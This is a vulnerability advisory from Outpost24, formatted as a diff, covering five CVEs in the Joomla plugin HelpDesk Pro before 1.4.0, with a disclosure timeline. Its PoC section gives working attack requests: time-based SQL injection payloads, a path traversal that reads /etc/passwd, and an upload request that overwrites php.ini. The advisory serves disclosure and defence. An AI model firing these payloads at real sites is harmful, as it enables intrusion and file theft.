@@ -1,0 +1,91 @@
+Document Title
+==============
+Joomla! plugin Helpdesk Pro < 1.4.0
+
+Reported By
+===========
+Simon Rawet from Outpost24
+Kristian Varnai from Outpost24
+Gregor Mynarsky from Outpost24
+https://www.outpost24.com/
+
+For full details, see;
+https://www.outpost24.com/outpost24-has-found-critical-vulnerabilities-in-joomla-helpdesk-pro/
+
+
+Tested on
+=========
+All exploits were tested and verified by Outpost24 for HelpDesk Pro version 1.3.0. While no official testing has been done on earlier versions, all versions prior to 1.4.0, where the issues were finally patched, are suspected of being vulnerable.
+
+Release Date
+============
+2015-07-16
+
+CVE
+===
+CVE-2015-4071 CVSS: 4.0 Direct Object References
+CVE-2015-4072 CVSS: 6.5 Multiple XSS
+CVE-2015-4073 CVSS: 7.8 SQL Injection
+CVE-2015-4074 CVSS: 7.8 Local file disclosure/Path traversal
+CVE-2015-4075 CVSS: 6.8 File Upload
+
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-05-23: Vulnerabilities discovered and reported to mitre
+2015-05-25: Vendor contacted
+2015-06-21: Vendor released update version: 1.4.0
+2015-07-16: Public disclosure
+
+
+PoC
+===
+
+Direct object references CVE-2015-4071.
+Authenticated
+Path: http://{target}/component/helpdeskpro/?view=ticket&id={ticketId}
+
+It's possible to read other users' support tickets by changing the numeric id.
+
+
+XSS CVE-2015-4072.
+Mostly authenticated dependent on site configuration
+Output validation is universally overlooked
+Example: Name and message
+Path: http://{target}/index.php?option=com_helpdeskpro&view=ticket&layout=form&Itemid=1
+
+
+SQLi CVE-2015-4073 for both SQLi.
+
+There are 3 SQLi:
+
+Authenticated
+Vulnerable parameter: filter_order
+Path: http://{url}/index.php?option=com_helpdeskpro&view=tickets
+Post data: search=&category_id=0&status_id=-1&limit=10&limitstart=0&option=com_helpdeskpro&task=&boxchecked=0&filter_order=SLEEP('10')&filter_order_Dir=DESC
+
+Unauthenticated
+Vulnerable parameter: ticket_code
+Path: http://{url}/index.php?option=com_helpdeskpro&view=ticket&ticket_code=1"%20or%20sleep(5)%20%23
+
+Unauthenticated
+Vulnerable parameter: email
+Path: http://{url}/index.php?option=com_helpdeskpro&task=ticket.save
+Post data: name=asdf&email=user@example.com"%20and%20sleep(5)%20and%20"3"="3
+
+
+Local file disclosure/Path traversal CVE-2015-4074.
+Unauthenticated
+Path: https://{url}/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe
+
+
+File Upload CVE-2015-4075.
+Unauthenticated
+Path: http://{url}/index.php?option=com_helpdeskpro&task=language.save
+Injected parameter: item, keys, attacker specified
+Post data: lang=&item=./../../../../../../etc/php5/apache2/php&keys[]=[PHP];&[PHP];=val%0aAnyData%0a;
+Description: Allows for .ini files to be created wherever the web server has write access. If the .ini file already exists and is writable, it will be overwritten by the server. In a poorly configured system, this will allow for code execution by including applicable arguments in .ini files. This however is not applicable to most systems. Any non-protected .ini files will be possible to replace, with impact depending per file. This PoC will overwrite the file /etc/php5/apache2/php.ini with the content:
+;key="val
+AnyData
+;"
